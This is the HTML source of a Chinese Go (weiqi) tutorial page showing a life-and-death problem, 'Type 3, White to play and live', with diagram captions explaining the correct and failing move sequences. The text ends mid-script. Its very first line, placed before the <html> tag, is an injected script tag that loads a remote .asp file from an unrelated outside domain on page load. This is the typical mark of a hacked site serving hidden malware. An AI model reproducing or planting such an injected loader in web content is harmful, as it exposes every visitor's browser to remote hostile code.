<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第3型 白先活</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体"><h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第3型     白先</span></font><span style="letter-spacing: 1pt"><font face="楷体_GB2312">活</font></span><!--mstheme--></font></h1>       <div align="center">         <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">         <tr>           <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No3_1.png" width="252" height="232"><!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No3_2.png" width="252" height="232"><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>        <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1托，是充分利用边上一子的手筋。黑2扳，白3倒虎，好！黑4如接，白5尖，a位的渡和b位的做眼成见合，白活定。</span></font><p>　<!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>        <p><span style="letter-spacing: 1pt"><font face="楷体_GB2312"> 		白1、黑2交换后，白3如鼓，则是败招。黑4点，如白a则黑b，连劫也不给打，白是净死。黑4如于a位打，白4位挡即成劫，黑失败。</font></span><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No3_3.png" width="252" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1</span></font><span style="letter-spacing: 1pt"><font face="楷体_GB2312">、3托、立，计算不深。黑4简单一粘，白做不出两眼，必死。请仔细确认之。</font></span></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page="No3.htm" S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-1110_back.gif"); MSFPnav1h=MSFPpreload("../../../_derived/b
